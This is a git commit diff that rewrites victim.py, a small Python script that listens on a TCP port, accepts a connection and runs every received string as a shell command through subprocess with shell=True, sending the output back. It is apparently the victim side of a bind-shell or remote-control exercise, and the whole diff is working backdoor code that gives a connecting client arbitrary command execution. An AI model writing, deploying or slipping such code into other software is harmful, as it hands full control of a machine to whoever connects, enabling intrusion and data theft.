dbee044c8c3c231a23b558059fc1493f7eb29fb3
illyrian <77370159+Illyr14n@users.noreply.github.com>
2023-11-21 04:11:50 +0000

    Update victim.py

--- victim.py
+++ victim.py
@@ -6,17 +6,27 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.bind(('127.0.0.1', 8080)) #binds to the ip and port
 
 s.listen(5) #listens for 5 connections
-client, addr = s.accept() #accepts a connection
-cmdlet = client.recv(2048)#receives the cmdlet
-while cmdlet!= 'exit':
-    print(cmdlet)
-    cmdlet = str(cmdlet)
+print("Listening for incoming connections...")
+client, addr = s.accept()
+print(f"Connection from {addr}")
 
-    results = subprocess.check_output(cmdlet, shell=True)#executes the cmdlet
-    print(results)#returns the results
-    client.send(results)#sends the results to the client
-    cmdlet = client.recv(2048).decode()#receives the results from the client
-cmdlet.close()
-s.close()
+try:
+    while True:
+        cmdlet = client.recv(2048).decode()
+        if cmdlet.lower() == 'exit':
+            break
+
+        print(f"Received command: {cmdlet}")
+        results = subprocess.check_output(cmdlet, shell=True).decode("utf-8")
+        print(results)
+
+        client.send(results.encode("utf-8"))
+
+except Exception as e:
+    print("Error:", str(e))
+
+finally:
+    client.close()
+    s.close()
 
 
